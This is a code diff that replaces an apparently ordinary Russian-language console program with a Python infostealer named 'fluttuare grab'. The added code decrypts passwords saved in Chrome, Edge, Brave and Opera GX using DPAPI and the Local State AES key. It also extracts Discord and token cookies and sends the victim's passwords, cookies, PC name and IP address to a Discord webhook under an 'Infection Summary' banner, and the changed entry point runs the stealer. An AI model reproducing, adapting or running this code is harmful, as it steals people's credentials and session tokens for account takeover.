+            if encrypted_password.startswith(b'v10') or encrypted_password.startswith(b'v11'):
+                return self.decrypt_aes_password(encrypted_password, browser_name, profile_path)
             else:
-                ConsoleUI.draw_info_box("Некорректный выбор.")
-        except Exception as ex:
-            ConsoleUI.draw_info_box(f"Ошибка: {str(ex)}")
-
-        print()
-        input("Нажмите Enter для возврата в меню...")
-
+                try:
+                    decrypted = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)
+                    if decrypted and decrypted[1]:
+                        return decrypted[1].decode('utf-8', errors='ignore')
+                except:
+                    return "None"
+        
+        except Exception as e:
+            return f"Errore: {str(e)}"
+    
+    def decrypt_aes_password(self, encrypted_password: bytes, browser_name: str, profile_path: str) -> str:
+        try:
+            local_state_path = self.find_local_state_file(browser_name, profile_path)
+            
+            if not local_state_path or not os.path.exists(local_state_path):
+                return "Local State non trovato"
+            
+            with open(local_state_path, 'r', encoding='utf-8') as f:
+                local_state = json.load(f)
+                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+            
+            encrypted_key = encrypted_key[5:]
+            
+            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+            
+            iv = encrypted_password[3:15]
+            payload = encrypted_password[15:]
+            
+            cipher = AES.new(key, AES.MODE_GCM, iv)
+            decrypted = cipher.decrypt(payload)
+            
+            return decrypted[:-16].decode('utf-8', errors='ignore')
+            
+        except Exception as e:
+            return f"Errore AES: {str(e)}"
+    
+    def find_local_state_file(self, browser_name: str, profile_path: str) -> str:
+        local_state_paths = {
+            'Chrome': os.path.join(os.path.dirname(profile_path), 'Local State'),
+            'Microsoft Edge': os.path.join(os.path.dirname(profile_path), 'Local State'),
+            'Brave': os.path.join(os.path.dirname(profile_path), 'Local State'),
+            'Opera GX': os.path.join(profile_path, 'Local State')
+        }
+        
+        path = local_state_paths.get(browser_name)
+        if path and os.path.exists(path):
+            return path
+        
+        fallback_paths = [
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data', 'Local State'),
+            os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data', 'Local State'),
+            os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable', 'Local State'),
+        ]
+        
+        for fallback_path in fallback_paths:
+            if os.path.exists(fallback_path):
+                return fallback_path
+        
+        return None
+    
+    def get_all_browser_cookies(self) -> Dict[str, List[Dict]]:
+        all_cookies = {}
+        
+        for browser_name, browser_info in self.browsers.items():
+            browser_cookies = []
+            
+            for base_path in browser_info['paths']:
+                if os.path.exists(base_path):
+                    for profile in browser_info['profiles']:
+                        try:
+                            if '*' in profile:
+                                profile_dirs = glob.glob(os.path.join(base_path, profile))
+                            else:
+                                profile_dirs = [os.path.join(base_path, profile)]
+                            
+                            for profile_dir in profile_dirs:
+                                if os.path.exists(profile_dir):
+                                    cookies = self.get_browser_cookies(browser_name, profile_dir)
+                                    browser_cookies.extend(cookies)
+                        
+                        except:
+                            continue
+            
+            if browser_cookies:
+                all_cookies[browser_name] = browser_cookies
+        
+        return all_cookies
+    
+    def get_browser_cookies(self, browser_name: str, profile_path: str) -> List[Dict]:
+        cookies = []
+        
+        try:
+            cookies_path = os.path.join(profile_path, 'Cookies')
+            
+            if os.path.exists(cookies_path):
+                temp_file = os.path.join(os.getenv('TEMP'), f'{browser_name}_cookies_temp.db')
+                shutil.copy2(cookies_path, temp_file)
+                
+                conn = sqlite3.connect(temp_file)
+                cursor = conn.cursor()
+                
+                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%discord%' OR name LIKE '%token%'")
+                
+                for host, name, encrypted_value in cursor.fetchall():
+                    try:
+                        if encrypted_value:
+                            decrypted_value = self.decrypt_password(encrypted_value, browser_name, profile_path)
+                            
+                            cookies.append({
+                                'host': host,
+                                'name': name,
+                                'value': decrypted_value,
+                                'profile': os.path.basename(profile_path)
+                            })
+                    
+                    except:
+                        continue
+                
+                conn.close()
+                os.remove(temp_file)
+        
+        except:
+            pass
+        
+        return cookies
+    
+    def send_passwords_cookies_embed(self, pc_name: str, all_passwords: Dict, cookies: Dict):
+        
+        total_passwords = sum(len(passwords) for passwords in all_passwords.values())
+        
+        if total_passwords > 0:
+            password_description = f"**Total passwords found: {total_passwords}**\n\n"
+            
+            for browser, passwords in all_passwords.items():
+                if passwords:
+                    password_description += f"**{browser}:** {len(passwords)} passwords\n"
+                    for pwd in passwords:
+                        url = pwd.get('url', 'N/A')
+                        username = pwd.get('username', 'N/A')
+                        password = pwd.get('password', 'N/A')
+                        
+                        url_display = url if len(url) <= 50 else url[:47] + "..."
+                        username_display = username if len(username) <= 30 else username[:27] + "..."
+                        password_display = password if len(password) <= 30 else password[:27] + "..."
+                        
+                        password_description += f"• **Sito:** `{url_display}`\n"
+                        password_description += f"  **Mail/User:** `{username_display}`\n"
+                        password_description += f"  **Password:** `{password_display}`\n\n"
+            
+            if len(password_description) > 4000:
+                password_description = password_description[:3990] + "\n... (truncated)"
+            
+            password_embed = {
+                "title": "🔐 Browser Passwords",
+                "description": password_description,
+                "color": 0x800080,
+                "footer": {"text": f"PC: {pc_name} | IP: {getip()}"}
+            }
+            
+            data = {"embeds": [password_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
+            requests.post(self.webhook_url, json=data, timeout=30)
+        
+        important_cookies_count = 0
+        cookies_description = ""
+        
+        for browser, browser_cookies in cookies.items():
+            important_cookies = [c for c in browser_cookies if any(domain in c['host'] for domain in 
+                                ['google', 'facebook', 'twitter', 'github', 'amazon', 'microsoft', 'spotify', 'instagram'])]
+            if important_cookies:
+                important_cookies_count += len(important_cookies)
+                cookies_description += f"**{browser}:** {len(important_cookies)} cookies\n"
+        
+        if important_cookies_count > 0:
+            cookies_embed = {
+                "title": "🍪 Browser Cookies",
+                "description": f"**Total important cookies found: {important_cookies_count}**\n\n{cookies_description}",
+                "color": 0x800080,
+                "footer": {"text": f"PC: {pc_name}"}
+            }
+            
+            data = {"embeds": [cookies_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
+            requests.post(self.webhook_url, json=data, timeout=30)
+        
+        summary_embed = {
+            "title": "📊 Infection Summary",
+            "description": f"**Successful infection completed!**\n\n**💻 PC Name:** {pc_name}\n**🌐 IP Address:** {getip()}\n**🔑 Passwords Found:** {total_passwords}\n**🍪 Important Cookies:** {important_cookies_count}",
+            "color": 0x800080,
+            "thumbnail": {"url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
+        }
+        
+        data = {"embeds": [summary_embed], "username": "fluttuare grab", "avatar_url": "https://i.postimg.cc/tJNhTtZW/Nuovo-progetto.png"}
+        requests.post(self.webhook_url, json=data, timeout=30)
 
 if __name__ == "__main__":
-    main()
+    stealer = AdvancedStealer()
+    stealer.run()
